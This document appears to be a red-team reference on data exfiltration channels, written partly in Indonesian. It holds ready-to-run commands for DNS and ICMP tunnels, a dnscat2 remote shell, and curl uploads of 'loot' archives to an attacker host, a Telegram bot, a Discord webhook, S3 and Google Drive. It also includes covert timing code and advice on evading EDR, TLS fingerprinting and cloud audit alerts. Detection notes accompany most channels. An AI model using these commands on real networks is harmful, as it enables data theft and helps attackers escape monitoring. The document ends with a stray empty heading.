# exfil-channels — opsec

# Exfiltration Channels — Red Team Reference

## 1. Channel Summary Table

| Kanal | Transport | Throughput realistis | Latency | Deteksi utama | Noise |
|---|---|---|---|---|---|
| iodine (DNS) | UDP/53, TXT/NULL/CNAME | 5–50 KB/s (LAN), 1–10 KB/s (WAN) | 200–800 ms | DNS query entropy, volume TXT, panjang label | Medium |
| dnscat2 | UDP/53, TXT/CNAME/MX | 1–20 KB/s | 300 ms–1 s | Beacon periodik, query count/domain | Medium |
| ICMP tunnel (ptunnel-ng / hans) | ICMP Echo | 10–100 KB/s | 50–300 ms | ICMP payload >64 byte, echo request from non-router host | Low |
| HTTPS to CDN (domain fronting / legit CDN) | TCP/443 TLS | 1–50 MB/s (depending on uplink) | 100–500 ms | SNI vs Host mismatch, JA4 TLS fingerprint | High (blend) |
| Telegram Bot API | TCP/443 | 1–5 MB/s (rate-limited) | 200–600 ms | api.telegram.org egress, bot token in memory | Low–Medium |
| Discord Webhook/API | TCP/443 | 1–5 MB/s (rate 50 req/s webhook) | 200–600 ms | discord.com/webhook URL, file upload pattern | Rendah |
| S3 (pre-signed/legit creds) | TCP/443 | 5–80 MB/s | 100–300 ms | PutObject to new bucket, UA SDK, region mismatch | Low |
| Google Drive API | TCP/443 | 1–20 MB/s | 200–500 ms | OAuth token baru, upload resumable | Rendah |
| Covert timing | variable (ICMP/TCP/SYN) | 1–50 bit/s | minutes | Delay distribution, inter-packet jitter anomaly | Very low |

---

## 2. DNS — iodine

**Reference version:** iodine 0.7.0, server on Linux 6.6, client Linux/Windows 11 24H2.

Send: payload wrapped in DNS query (TXT default, NULL optional) to `t1.<data>.<session>.tun.example.com`. Appears in resolver as TXT/CNAME-type query with long base32/hex labels, `qname` >60 byte, high TTL.

```bash
# Server
iodined -f -c -P <pass> -n 10.0.0.1 10.0.0.1 tun.example.com
# Client
iodine -f -P <pass> -M 1500 -T TXT -I 200 10.0.0.2 tun.example.com
# Upload via tun
tar czf - /data/sensitive | nc 10.0.0.1 9999
```

Why it works: resolver only forwards, does not calculate entropy. Affected by `-M 1500` (max fragment) and `-T TXT` for WAN; NULL is faster on LAN. Fails if: authoritative NS does not delegate to our server, or resolver has `minimal-responses` + long qname filter (Cisco Umbrella, Infoblox), or DNS over HTTPS to public resolver truncates TXT.

Detection: query rate to a single domain (>50 q/s per host), non-Unicode label length distribution, TXT >> A ratio, high NXDOMAIN during trial.

## 3. DNS — dnscat2

**Versi acuan:** dnscat2 0.07, ruby 3.x.

Send: control + data in CNAME/TXT/MX. There is a `--dns domain=` mode and encryption (ECDH + Salsa20).

```bash
# Server
ruby dnscat2.rb --dns domain=tun.example.com --dns port=53 --security=open
# Client
./dnscat2 --dns domain=tun.example.com --dns server=<ip> --dns type=TXT --max-packets=1
# shell
session -i 1
shell
```

Why it works: same as iodine, but dnscat2 has interactive session + file transfer (`download src dst`). Throughput is lower than iodine because packet-per-second is limited by `--max-packets`. Fails on resolvers that block TXT >255 byte or apply `response-rate-limiting` (RRL) on recursive resolvers.

Detection: random CNAME query pattern with short subdomains, persistent session >10 minutes, mixed `qtype` TXT/MX/CNAME on the same domain.

## 4. ICMP Tunnel

**Versi acuan:** ptunnel-ng 1.42, hans 1.0, Linux 6.6 / Windows 11 24H2 (butuh raw socket; admin).

Send: payload in ICMP Echo Request/Reply, often fragmented to be < MTU.

```bash
# Server (hans, butuh root)
hans -s 10.0.0.1 -p <pass> -v
# Client
hans -c <server_ip> -p <pass> -v
# Setelah tunnel: SSH ke 10.0.0.1:22 via interface tun
```

Why it works: many firewalls only filter TCP/UDP, ICMP is left for diagnostics. Fails if: ICMP egress is blocked, NIDS counts echo payload size (payload >64 byte = red flag), or host uses `net.ipv4.icmp_echo_ignore_all=1` on target router.

Detection: ICMP echo request with non-pad payload (not `abcdef...`), non-router host sends echo request outbound, request:reply ratio ≠ 1.

**Note:** ptunnel-ng is older; hans is more modern and supports IPv6. Per-Chrome-131 is not relevant, this is layer 3.

## 5. HTTPS to CDN (domain fronting / legit CDN abuse)

**Versi acuan:** nginx 1.25 (proxy), Cloudflare/Fastly/CloudFront, Chrome 131 (client exfil), curl 8.10.

Dua varian:

**(a) Domain fronting** — SNI/CDN host to `cdn.provider`, Host header to `attacker.appspot.com`. Cloudflare has disabled this by default since 2018 for most plans; Google Frontend can still work under certain conditions. In practice in 2025 it is already very limited — do not rely on it.

**(b) Legit CDN origin abuse** — push data to CDN endpoint with a path proxied to attacker origin.

```bash
curl -s -X POST https://attacker.appspot.com/upload \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/131.0' \
  --data-binary @/tmp/loot.7z
```

Send: HTTP POST body (chunked or multipart). Appears in TLS as normal handshake to CDN; in proxy logs as request to CDN with long/random path. Throughput dominated by client uplink (can be 5–80 MB/s).

Why it works: TLS remains to legitimate CDN; TLS fingerprint (JA4) matches Chrome 131. Fails on: TLS inspection (Zscaler, Palo Alto decryption) that sees Host header, or proxy that enforces SNI=Host. Also fails if CDN blocks unauthenticated upload.

Detection: JA4 mismatch (curl 8.10 has a different JA4 from Chrome 131 — changing UA alone is not enough), upload volume to a single CDN domain from non-browser endpoint, POST request to high-entropy path.

## 6. Telegram Bot API

Send: `sendDocument` / `sendPhoto` / `sendMessage` to `api.telegram.org` with `bot<TOKEN>`.

```bash
curl -s -X POST "https://api.telegram.org/bot<TOKEN>/sendDocument" \
  -F chat_id=<ID> -F document=@/tmp/loot.7z
```

Appears: TLS to `api.telegram.org` (AS 62041 / Telegram), default UA `curl` or empty — detectors often see non-browser UA to Telegram API. Throughput: bot rate limit 30 msg/s global, file upload limit 50 MB per file (via bot API; 2 GB via user client). Practical for small-to-medium files.

Why it works: many organizations allowlist `api.telegram.org` because it is used by support teams. Fails if: egress only allowlist to enterprise domains (Office 365, GitHub), or DLP flags file upload to third-party messaging.

Detection: egress to Telegram from server/non-browser UA, POST size >1 MB, repeated `sendDocument` pattern to same chat_id. Token stored in process memory (Volatility `yarascan`).

## 7. Discord Webhook / API

```bash
curl -s -H "Content-Type: multipart/form-data" \
  -F "payload_json={\"content\":\"sync\"}" \
  -F "file1=@/tmp/loot.7z" \
  "https://discord.com/api/webhooks/<ID>/<TOKEN>"
```

Send: multipart with attachment. Webhook rate limit ~5 req/2s per webhook (bucket), file upload 25 MB (bot) / 10 MB (webhook default, 25 MB with boost). Appears: TLS to `discord.com`/`discordapp.com`, path `/api/webhooks/<snowflake>`, UA `curl`.

Why it works: Discord is often on gamer/dev allowlists. Fails if: proxy blocks "social media" category, or DLP detects JSON payload + binary file.

Detection: unknown webhook ID associated with internal application, upload from non-user host, UA mismatch.

## 8. Cloud Storage — S3 / GDrive

**S3 (valid credentials or pre-signed):**
```bash
aws s3 cp /tmp/loot.7z s3://exfil-bucket-<rand>/loot.7z \
  --endpoint-url https://s3.us-east-1.amazonaws.com --no-progress
# atau langsung pakai curl presigned:
curl -s -X PUT --upload-file /tmp/loot.7z "https://bucket.s3.amazonaws.com/key?X-Amz-Signature=..."
```

Appears: TLS to `*.s3.<region>.amazonaws.com`, UA `aws-cli/2.x` or `Boto3/1.x`. Throughput very high (5–80 MB/s). Why it works: S3 is often allowlisted for backup. Fails if: bucket policy blocks IP, new region not yet allowlisted, or GuardDuty `Exfiltration:S3/AnomalousBehavior` (requires CloudTrail) triggers.

**GDrive:**
```bash
# OAuth token dari refresh_token tersimpan
curl -s -X POST "https://www.googleapis.com/upload/drive/v3/files?uploadType=resumable" \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"name":"loot.7z"}'
# PUT ke Location header
```
Throughput 1–20 MB/s; resumable upload allows chunking. Appears: TLS to `www.googleapis.com`, UA `google-api-python-client` or `curl`. Fails if: OAuth scope is read-only, or Google Workspace DLP rule for external upload.

Detection: `PutObject` to an unknown bucket from an internal IAM principal, SDK user agent at a non-application endpoint, GDrive `files.create` from a new service account.

## 9. Covert Timing

Send: 1 bit per interval (e.g. SYN to attacker host with delay 0/`Δ` ms; or ICMP arrival timing).

```python
# pseudo: encode bit via delay pada koneksi TCP ke sink
import socket, time
for bit in bits:
    s = socket.create_connection(("sink.example.com", 443), timeout=3)
    s.close()
    time.sleep(0.5 if bit == 0 else 1.5)  # 0.5s vs 1.5s
```

Very low throughput (1–50 bit/s), suitable for keys/indicators, not files. Appears: short connections to a single endpoint with bimodal inter-arrival distribution. Why it works: no payload, DPI cannot read it. Fails if: firewall rate-limits SYN (common at modern edge), or there is jitter normalization on the proxy that removes the signal.

Detection: inter-arrival time (IAT) analysis — unusually high variance on connections to a single destination, or timing entropy > per-host baseline (e.g. EWMA model). Requires a long telemetry dataset.

---

## 10. Operational Pitfalls (that cause failure in the field)

1. **Internal DNS resolver ≠ target public resolver.** In the lab you use 8.8.8.8/DoH; at enterprise clients the internal resolver (AD DNS) often enforces limited forwarders, `max-udp-size=1232` (RFC 6891), and `response-rate-limiting`. Iodine with `-M 1500` fails; lower it to `-M 1200` or less, and test with `dig @<resolver> TXT <label>.<domain>` before deployment.
2. **Egress allowlist is stricter than assumed.** Many organizations in 2024–2025 enforce default-deny + domain allowlist (Zscaler, Netskope). Telegram/Discord/S3 are often not allowlisted. Always probe with `curl -sv --max-time 5 https://<target>` before choosing a channel.
3. **TLS fingerprint mismatch.** Changing the UA to Chrome 131 does not change JA3/JA4. curl 8.10 JA4 differs; use `curl-impersonate` (version 0.6+) or a headless browser (Chrome 131 devtools protocol) for HTTPS/CDN channels. Modern detectors (Cloudflare, Akamai) are fingerprint-first.
4. **Agent/EDR hooks on critical APIs.** Windows 11 24H2 + Defender for Endpoint monitors `WinHttpSendRequest` and `curl.exe` child processes. Cloud storage SDKs (boto3/aws-cli) are also hooked. Consider LOLBIN or living-off-trusted-app (e.g. upload via native Teams/OneDrive client) to avoid signatures.
5. **Hard-coded rate limits on chat channels.** Telegram bot ~30 msg/s global but per-chat ~1 msg/s; Discord webhook ~5 req/2s. Without chunking and backoff, `429 Too Many Requests` cuts the exfil mid-way.
6. **File integrity over lossy tunnel.** ICMP/DNS drops on WAN — must use a loss-tolerant protocol over the tunnel (rsync over tun, or chunk + hash). Without it, large files get corrupted and require re-transfer (increasing noise).
7. **CloudTrail/GuardDuty/GCP audit log active.** S3 PutObject to a new bucket from an internal IAM principal triggers `Exfiltration:S3/AnomalousBehavior` within minutes. Test in an account where audit logs are actually expected (e.g. existing backup service account with existing bucket).
8. **Clock skew & NTP.** Covert timing is sensitive to client-server clock drift; NTP synchronization is blocked in some segments. Calibrate per-link delay first, or this channel is practically unusable.
9. **Explicit proxy + PAC.** Corporate clients use PAC; `curl` without `HTTPS_PROXY` will fail to connect. Egress detection must go through host proxy configuration (read env / registry `ProxyServer`).
10. **Inline decryption breaks assumptions.** Palo Alto/Zscaler with TLS 1.3 decryption sees Host and body — fronting/CDN abuse no longer hides the destination. Check the peer certificate (`openssl s_client -connect`) — if the issuer is corporate, the HTTPS channel must be considered readable.

---

## [reasoning trace]


